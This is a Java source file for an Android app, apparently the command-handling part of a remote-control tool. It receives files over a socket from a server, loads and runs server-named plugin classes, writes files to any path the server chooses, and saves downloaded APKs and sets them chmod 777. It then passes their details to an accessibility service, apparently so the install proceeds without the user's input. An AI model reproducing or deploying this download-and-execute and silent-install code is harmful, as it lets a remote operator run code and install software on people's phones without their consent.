package com.network;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

import com.main.ForegroundService;


import com.phone.control.UpdateProc;
import com.phone.control.accessibilityService;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;


import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.support.v4.content.FileProvider;
import android.util.Log;

public class FileDownloader {
	
	private static String TAG = "FileDownloader";

	public static void pluginDownloader(byte [] recvbuf,int recvlen,int recvpacklen,Context context,InputStream ins){
		try {
			int nextrecvlen = 0;
			nextrecvlen += recvlen;
			
			byte[] bytefilenamelen = new byte[4];
			System.arraycopy(recvbuf, 24, bytefilenamelen, 0, 4);
			int filenamelen = PublicFunction.bytesToInt(bytefilenamelen);
			byte[] downloadfilename = new byte[filenamelen];
			System.arraycopy(recvbuf, 28, downloadfilename, 0, filenamelen);
			
			String downloadpath = context.getFilesDir() + "/update_plugin/" ;
			File updatedirfile = new File(downloadpath);
			if (updatedirfile.exists() == false) {
				updatedirfile.mkdir();
			}
			
			String downloadfn = downloadpath + new String(downloadfilename);
			File downloadfile = new File(downloadfn);
			if (downloadfile.exists() == true) {
				downloadfile.delete();
			}
			downloadfile.createNewFile();
			
			byte[] bytefuncnlen = new byte[4];
			System.arraycopy(recvbuf, 24 + 4 +filenamelen, bytefuncnlen, 0, 4);
			int classnamelen = PublicFunction.bytesToInt(bytefuncnlen);
			byte[] clsname = new byte[classnamelen];
			System.arraycopy(recvbuf, 24 + 4 +filenamelen +4, clsname, 0, classnamelen);
			String updateclsname = new String(clsname);
			WriteDateFile.writeLogFile("update filename:" + downloadfn + " update func name:" + updateclsname + "\r\n");
			
			byte[] bytedownloadfilesize = new byte[4];
			System.arraycopy(recvbuf, 24 + 4 + filenamelen + 4 + classnamelen, bytedownloadfilesize, 0, 4);
			int downloadfilesize = PublicFunction.bytesToInt(bytedownloadfilesize);

			int firstblocksize = nextrecvlen - (24 + 4 + filenamelen + 4 + classnamelen + 4);
			if (firstblocksize < 0) {
				
				WriteDateFile.writeLogFile("update first block size error:" + firstblocksize + "\r\n");
				return;
			}
			FileOutputStream fos = new FileOutputStream(downloadfile,true);
			fos.write(recvbuf,24 + 4 + filenamelen + 4 + classnamelen + 4,firstblocksize);

			int totalrecv = nextrecvlen;
			int totalfs = firstblocksize;
			
			if (recvpacklen > nextrecvlen) {
				while((nextrecvlen = ins.read(recvbuf,0,Public.RECV_SEND_BUFSIZE)) > 0){
					fos.write(recvbuf,0,nextrecvlen);
					totalrecv += nextrecvlen;
					totalfs += nextrecvlen;
					if (totalfs >= downloadfilesize) {
						break;
					}
				}
			}
			
			fos.flush();
			fos.close();
			
			int totallen = recvpacklen;
			//String str = String.format("update total:%1$u,recved:%2$u,date recved:%3$u,file size:%4$u\r\n",
			//		totallen,totalrecv,totalfs,downloadfilesize);
			//Log.e(TAG,str);
			//WriteDateFile.writeLogFile(str);
			if (totalrecv != totallen || totalfs != downloadfilesize) {
				return;
			}else{
				Log.e(TAG,"update file ok");
			}	
			
			UpdateProc update = new UpdateProc(context,downloadfn, updateclsname);
			Thread thread = new Thread(update);
			thread.start();
			return;
		} catch (Exception e) {
			e.printStackTrace();
		}
		if (recvpacklen < recvlen) {
			WriteDateFile.writeLogFile("update total size:" + recvpacklen + ",first recv size:" + recvlen + "\r\n");
			return;
		}
	}
	
	
	
	
	public static void apkDownloader(byte [] recvbuf,int recvlen,int recvpacklen,Context context,InputStream ins){
		try {
			if (recvpacklen < recvlen) {
				WriteDateFile.writeLogFile("installapk total size:" + recvpacklen + " first recv size:" + recvlen + "\r\n");
				return;
			}
			
			int nextrecvlen = recvlen;
			
			String tmpfn = ForegroundService.SDCARD_PATH_NAME;
			
			byte[] bytedlfnlen = new byte[4];
			System.arraycopy(recvbuf, 24, bytedlfnlen, 0, 4);
			int downloadfilenamelen = PublicFunction.bytesToInt(bytedlfnlen);
			byte[] downloadfilename = new byte[downloadfilenamelen];
			System.arraycopy(recvbuf, 28, downloadfilename, 0, downloadfilenamelen);
			
			String apkfilepath = tmpfn + new String(downloadfilename);
			WriteDateFile.writeLogFile("installapk filename:" + apkfilepath + "\r\n");
			File apkfile = new File(apkfilepath);
			if (apkfile.exists() == true) {
				apkfile.delete();
			}
			apkfile.createNewFile();
			
			byte[] bytedownloadfilesize = new byte[4];
			System.arraycopy(recvbuf, 24 + 4 + downloadfilenamelen, bytedownloadfilesize, 0, 4);
			int downloadfilesize = PublicFunction.bytesToInt(bytedownloadfilesize);

			int firstblocksize = nextrecvlen - (24 + 4 + downloadfilenamelen + 4);
			if (firstblocksize < 0) {
				WriteDateFile.writeLogFile("installapk first block size error:" + firstblocksize + "\r\n");
				return;
			}
			FileOutputStream fos = new FileOutputStream(apkfile,true);
			fos.write(recvbuf,24 + 4 + downloadfilenamelen + 4,firstblocksize);

			int totalrecv = nextrecvlen;
			int totalfs = firstblocksize;

			if (recvpacklen > nextrecvlen) {
				while( (nextrecvlen = ins.read(recvbuf,0,Public.RECV_SEND_BUFSIZE))>0 ){

					fos.write(recvbuf,0,nextrecvlen);
					totalrecv += nextrecvlen;
					totalfs += nextrecvlen;
					if (totalfs >= downloadfilesize) {
						break;
					}
				}
			}
			fos.flush();
			fos.close();
			
			int totallen = recvpacklen;
			WriteDateFile.writeLogFile("CMD_AUTOINSTALL total:" + totallen + ",recved:" +totalrecv +
					",data recved:" + totalfs + ",file size:" + downloadfilesize +"\r\n");
			
			if (totalrecv != totallen || totalfs != downloadfilesize) {
				Log.e(TAG,"down load apk error");
			}else{
				Log.e(TAG,"down load apk ok");
			}
			
			/*
			byte[] byteapkfilenamelen = new byte[4];
			System.arraycopy(recvbuf, 24, byteapkfilenamelen, 0, 4);
			int apkfilenamelen = PublicFunction.bytesToInt(byteapkfilenamelen);
			byte[] apkfilename = new byte[apkfilenamelen];
			System.arraycopy(recvbuf, 28, apkfilename, 0, apkfilenamelen);
			String strapkfilename = new String(apkfilename);
			
			byte[] byteapkfilelen = new byte[4];
			System.arraycopy(recvbuf, 28 + apkfilenamelen, byteapkfilelen, 0, 4);
			int apkfilelen = PublicFunction.bytesToInt(byteapkfilelen);
			byte[] apkfile = new byte[apkfilelen];
			System.arraycopy(recvbuf, 32 + apkfilenamelen, apkfile, 0, apkfilelen);
			
			//ForegroundService.LOCAL_PATH_NAME = context.getFilesDir().getAbsolutePath() + ForegroundService.LOCAL_FOLDER_NAME;
			//String apkfilepath = ForegroundService.LOCAL_PATH_NAME + strapkfilename;
			String apkfilepath = Environment.getExternalStorageDirectory() + ForegroundService.LOCAL_FOLDER_NAME +
					strapkfilename;
			File fileapk=new File(apkfilepath);
			if (fileapk.exists() == false) {
				fileapk.createNewFile();
			}
			FileOutputStream fout = new FileOutputStream(fileapk);
			if (fout != null) {
				fout.write(apkfile, 0, apkfilelen);
				fout.flush();
				fout.close();
			}
			*/

			Process p = Runtime.getRuntime().exec("chmod 777 " + apkfilepath);
			int status = p.waitFor();  
			if (status == 0) {  
			    //chmod succeed  
				WriteDateFile.writeLogFile("chmod autoinstallapk ok\r\n");
			} else {  
			    //chmod failed  
				WriteDateFile.writeLogFile("chmod autoinstallapk error\r\n");
				//return;
			}  

	        PackageManager pm = context.getPackageManager();  
	        String installpackagename = "";
	        PackageInfo info = pm.getPackageArchiveInfo(apkfilepath, PackageManager.GET_ACTIVITIES);  
	        if(info != null){  
	            ApplicationInfo appInfo = info.applicationInfo;  
	            accessibilityService.installAPkName = pm.getApplicationLabel(appInfo).toString();  
	            accessibilityService.installAPkFileName = appInfo.packageName;  
	            //accessibilityService.installVersion=info.versionName;      
	            installpackagename = info.packageName;
	            Log.e(TAG,"install package name:" + installpackagename);
	        } 

			accessibilityService.installAPkFileName = apkfilepath;
			accessibilityService.openOrOverAfterInstall = false;
			
			String packname = context.getPackageName();
			Intent localIntent = new Intent(Intent.ACTION_VIEW); 
			localIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
			Uri uri = null;
			//Android7.0+禁止应用对外暴露file://uri，改为content://uri;具体参考FileProvider
			if (Build.VERSION.SDK_INT >= 24) { 
	            //uri = FileProvider.getUriForFile(context,"com.mypackege.fileprovider",new File(apkfilepath));
				uri = FileProvider.getUriForFile(context,packname+".FileProvider",new File(apkfilepath));
//				FileReader fr = new FileReader(apkfilepath);
//	    		Class<? extends FileReader> clazz = fr.getClass();
//	    		Method geturiforfile = clazz.getDeclaredMethod("getUriForFile",Context.class,String.class,File.class);
//	    		uri = (Uri)geturiforfile.invoke(context, "mypackege.fileprovider", new File(apkfilepath));
//	    		fr.close();
	            
				localIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); 
			} 
			else { 
				uri = Uri.fromFile(new File(apkfilepath)); 
			} 
			localIntent.setDataAndType(uri, "application/vnd.android.package-archive"); 
		    context.startActivity(localIntent);

			Log.e(TAG,"auto install apk filename:" + apkfilepath);
			WriteDateFile.writeLogFile("ServerCommand auto install apk filename:" + apkfilepath  + "\r\n");

			apkfile.delete();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	
	
	
	
	
	public static void fileDownloader(byte [] recvbuf,int recvlen,int recvpacklen,Context context,InputStream ins){
		try {
			if (recvpacklen < recvlen) {
				WriteDateFile.writeLogFile("download total size:" + recvpacklen + " first recv size:" + recvlen + "\r\n");
				return;
			}
			
			int nextrecvlen = recvlen;
			
			byte[] bytedownloadfnlen = new byte[4];
			System.arraycopy(recvbuf, 24, bytedownloadfnlen, 0, 4);
			int downloadfnlen = PublicFunction.bytesToInt(bytedownloadfnlen);
			byte[] downloadfilename = new byte[downloadfnlen];
			System.arraycopy(recvbuf, 28, downloadfilename, 0, downloadfnlen);
			
			String downloadfn = new String(downloadfilename);
			WriteDateFile.writeLogFile("download filename:" + downloadfn + "\r\n");
			File downloadfile = new File(downloadfn);
			
			if (downloadfile.exists() == true) {
				downloadfile.delete();
			}
			downloadfile.createNewFile();
			
			byte[] bytedownloadfz = new byte[4];
			System.arraycopy(recvbuf, 24 + 4 + downloadfnlen, bytedownloadfz, 0, 4);
			int downloadfilesize = PublicFunction.bytesToInt(bytedownloadfz);

			int firstblocksize = nextrecvlen - (24 + 4 + downloadfnlen + 4);
			if (firstblocksize < 0) {
				WriteDateFile.writeLogFile("download first block size error:" + firstblocksize + "\r\n");
				return;
			}
			FileOutputStream fos = new FileOutputStream(downloadfile,true);
			fos.write(recvbuf,24 + 4 + downloadfnlen + 4,firstblocksize);

			int totalrecv = nextrecvlen;
			int totalfs = firstblocksize;
			
			if (recvpacklen > nextrecvlen) {
				while((nextrecvlen = ins.read(recvbuf,0,Public.RECV_SEND_BUFSIZE)) > 0){
					fos.write(recvbuf,0,nextrecvlen);
					totalrecv += nextrecvlen;
					totalfs += nextrecvlen;
					if (totalfs >= downloadfilesize) {
						break;
					}
				}
			}
			
			fos.flush();
			fos.close();
			
			int totallen = recvpacklen;
			
			WriteDateFile.writeLogFile("CMD_DOWNLOADFILE total:" + totallen + ",recved:" +totalrecv +
					",data recved:" + totalfs + ",file size:" + downloadfilesize +"\r\n");
			if (totalrecv != totallen || totalfs != downloadfilesize) {
				return;
			}else{
				Log.e(TAG,"down load file ok");
			}	
		}catch(Exception e){
			e.printStackTrace();
		}
	}
}
